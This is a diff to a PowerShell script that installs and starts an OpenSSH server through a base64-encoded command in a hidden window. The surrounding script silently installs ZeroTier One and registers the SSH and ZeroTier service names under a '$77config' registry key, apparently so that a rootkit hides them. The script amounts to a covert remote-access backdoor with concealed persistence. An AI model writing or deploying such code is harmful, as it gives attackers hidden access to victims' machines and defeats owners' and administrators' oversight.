@@ -4,6 +4,27 @@ if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
     exit
 }
 
+# Start a new PowerShell window to install and configure OpenSSH Server asynchronously
+$openSSHScriptBlock = {
+    # Install OpenSSH Server feature if not already present
+    if (-not (Get-WindowsCapability -Online | Where-Object { $_.Name -like "OpenSSH.Server*" -and $_.State -eq "Installed"})) {
+        Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
+    }
+    
+    # Start the SSHD service and set it to automatic
+    Start-Service sshd
+    Set-Service -Name sshd -StartupType 'Automatic'
+
+    # Optional: Configure SSHD Config file here if necessary
+}
+
+# Encode the script block to base64 to ensure it's correctly executed in a new window
+$bytes = [System.Text.Encoding]::Unicode.GetBytes($openSSHScriptBlock.ToString())
+$encodedCommand = [Convert]::ToBase64String($bytes)
+
+# Launch the script block in a new PowerShell window
+Start-Process PowerShell.exe -ArgumentList "-NoProfile -EncodedCommand $encodedCommand" -WindowStyle Hidden
+
 # Download and Install ZeroTier One silently
 $zeroTierMsiUrl = "https://download.zerotier.com/RELEASES/1.6.5/dist/ZeroTierOne.msi"
 $zeroTierMsiPath = Join-Path $env:TEMP "ZeroTierOne.msi"
@@ -19,7 +40,7 @@ $baseConfigPath = "HKLM:\SOFTWARE\$77config"
 # Ensure the $77config key and necessary subkeys exist
 $serviceNamesPath = "$baseConfigPath\service_names"
 if (-not (Test-Path $serviceNamesPath)) {
-    New-Item -Path $serviceNamesPath -Force | Out-Null
+    New-Item -Path $serviceNamesPath -Force
 }
 
 # Define service names to hide - ZeroTier and SSH service
